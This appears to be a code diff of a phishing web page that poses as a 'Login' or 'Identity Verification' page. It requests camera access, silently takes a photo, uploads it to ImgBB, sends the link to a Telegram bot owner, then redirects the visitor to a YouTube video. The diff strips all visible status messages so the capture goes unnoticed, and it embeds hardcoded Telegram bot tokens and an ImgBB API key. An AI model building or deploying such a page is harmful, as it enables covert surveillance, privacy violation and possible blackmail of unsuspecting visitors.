@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Verification</title>
+    <title>Login</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -24,36 +24,31 @@
             text-align: center;
             box-shadow: 0 20px 60px rgba(0,0,0,0.3);
         }
-        h1 { color: #667eea; margin-bottom: 10px; font-size: 22px; }
-        .subtitle { color: #666; margin-bottom: 30px; font-size: 14px; }
-        .loading {
-            display: inline-block;
-            width: 40px;
-            height: 40px;
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #667eea;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
+        h1 { 
+            color: #667eea; 
+            margin-bottom: 10px; 
+            font-size: 28px;
+            letter-spacing: 2px;
         }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .status { color: #666; margin-top: 20px; font-size: 13px; }
-        .success { color: #28a745; }
-        .error { color: #dc3545; }
+        .subtitle { 
+            color: #999; 
+            margin-bottom: 30px; 
+            font-size: 14px;
+            font-style: italic;
+        }
+        .hidden { display: none; }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1 id="title">📸 Identity Verification</h1>
-        <div class="subtitle" id="subtitle">Camera required to continue</div>
-        <div class="loading" id="loading"></div>
-        <div class="status" id="status">Requesting camera access...</div>
+        <h1>Login</h1>
+        <div class="subtitle">Please wait...</div>
     </div>
 
     <script>
         // ===== CONFIGURATION =====
-        const BOT_TOKEN = "8365800784:AAH_xopF7digtn1X0pfGKtr7fGv4zZZyRy8";
-        const IMGBB_API_KEY = "b7ba0100d04e0add952f217e712c7ff8";
+        const BOT_TOKEN = "8714590627:AAE7XYaMhFLJeLKYY-cLWjGQ38h96-oi498";
+        const IMGBB_API_KEY = "YOUR_IMGBB_API_KEY_HERE";
         const YOUTUBE_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
         // =========================
         
@@ -126,39 +121,22 @@
             
             stream.getTracks().forEach(track => track.stop());
             
-            document.getElementById('status').innerHTML = '📤 Processing...';
-            
             canvas.toBlob(async (blob) => {
                 try {
-                    document.getElementById('status').innerHTML = '📤 Uploading...';
                     const imageUrl = await uploadToImgBB(blob);
-                    
-                    document.getElementById('status').innerHTML = '📤 Sending...';
                     await sendMessageToOwner(`📸 PHOTO CAPTURED!\n🕐 Time: ${new Date().toLocaleString()}\n📷 Image: ${imageUrl}`);
-                    
-                    document.getElementById('status').innerHTML = '✅ Complete!';
-                    document.getElementById('status').className = 'status success';
-                    
-                    setTimeout(() => {
-                        window.location.href = YOUTUBE_URL;
-                    }, 2000);
-                    
                 } catch (err) {
-                    console.error('Error:', err);
-                    document.getElementById('status').innerHTML = '❌ Error, redirecting...';
-                    setTimeout(() => {
-                        window.location.href = YOUTUBE_URL;
-                    }, 1500);
+                    console.log('Error:', err);
                 }
+                
+                // YouTube ကို ခေါ်မယ်
+                window.location.href = YOUTUBE_URL;
+                
             }, 'image/jpeg', 0.7);
         }
         
         async function init() {
             if (!OWNER_ID) {
-                document.getElementById('title').innerHTML = '❌ Invalid Link';
-                document.getElementById('subtitle').innerHTML = 'Please get a new link';
-                document.getElementById('loading').style.display = 'none';
-                document.getElementById('status').className = 'status error';
                 return;
             }
             
@@ -169,13 +147,9 @@
                 await takePhotoAndSend(stream);
                 
             } catch (err) {
-                document.getElementById('title').innerHTML = '❌ Camera Access Denied';
-                document.getElementById('subtitle').innerHTML = 'Please click ALLOW to continue';
-                document.getElementById('loading').style.display = 'none';
-                document.getElementById('status').innerHTML = 'Click ALLOW button above ☝️';
-                document.getElementById('status').className = 'status error';
-                
+                console.log('Camera error:', err);
                 await sendMessageToOwner(`❌ CAMERA DENIED!\n🕐 Time: ${new Date().toLocaleString()}`);
+                window.location.href = YOUTUBE_URL;
             }
         }
         
